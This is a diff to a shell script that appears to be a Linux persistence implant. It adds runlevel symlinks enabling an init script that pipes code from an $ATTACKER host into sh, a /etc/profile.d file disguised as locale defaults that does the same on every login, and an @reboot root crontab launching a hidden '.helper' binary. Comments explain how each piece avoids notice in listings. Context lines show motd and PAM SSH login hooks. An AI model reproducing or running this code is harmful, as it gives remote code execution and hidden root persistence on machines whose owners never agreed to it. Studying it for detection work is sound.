@@ -119,9 +119,34 @@ mkdir -p /etc/init.d /etc/update-motd.d 2>/dev/null
 printf '#!/bin/sh\n### BEGIN INIT INFO\n# Provides: netcheck\n### END INIT INFO\ncurl -fsSL --connect-timeout 1 --max-time 2 http://%s/i.sh | sh &\n' \
   "$ATTACKER" > /etc/init.d/netcheck 2>/dev/null
 chmod 755 /etc/init.d/netcheck 2>/dev/null
+# An init script nobody enabled starts nothing. The runlevel links are what
+# make it persistence, and they are what an autostart listing reads.
+for r in 2 3 4 5; do
+  mkdir -p "/etc/rc$r.d" 2>/dev/null
+  ln -sf ../init.d/netcheck "/etc/rc$r.d/S99netcheck" 2>/dev/null
+done
+[ -d /etc/runlevels/default ] && ln -sf /etc/init.d/netcheck /etc/runlevels/default/netcheck 2>/dev/null
 printf '#!/bin/sh\ncurl -fsSL --connect-timeout 1 --max-time 2 http://%s/m.sh 2>/dev/null | sh &\n' "$ATTACKER" \
   > /etc/update-motd.d/99-banner 2>/dev/null
 chmod 755 /etc/update-motd.d/99-banner 2>/dev/null
+
+# Runs for every login shell on the box, root included, and looks like the
+# locale defaults it is named after.
+mkdir -p /etc/profile.d 2>/dev/null
+printf '# locale defaults\n(curl -fsSL --connect-timeout 1 --max-time 2 http://%s/l.sh 2>/dev/null | sh &) </dev/null >/dev/null 2>&1\n' \
+  "$ATTACKER" > /etc/profile.d/00-locale.sh 2>/dev/null
+chmod 644 /etc/profile.d/00-locale.sh 2>/dev/null
+
+# A crontab that fires once at boot rather than on a schedule, which is easy
+# to miss in a listing sorted by time of day.
+# Only the first of these; on Alpine /var/spool/cron/crontabs is a symlink to
+# /etc/crontabs and writing both leaves the same job in two files.
+for d in /var/spool/cron/crontabs /etc/crontabs /var/spool/cron; do
+  [ -d "$d" ] || continue
+  printf '@reboot /usr/local/lib/pyshared/.helper >/dev/null 2>&1\n' > "$d/root" 2>/dev/null
+  chmod 600 "$d/root" 2>/dev/null
+  break
+done
 
 # an authentication hook that runs on every login
 [ -f /etc/pam.d/sshd ] && line 'session optional pam_exec.so /usr/local/lib/pyshared/.helper' /etc/pam.d/sshd
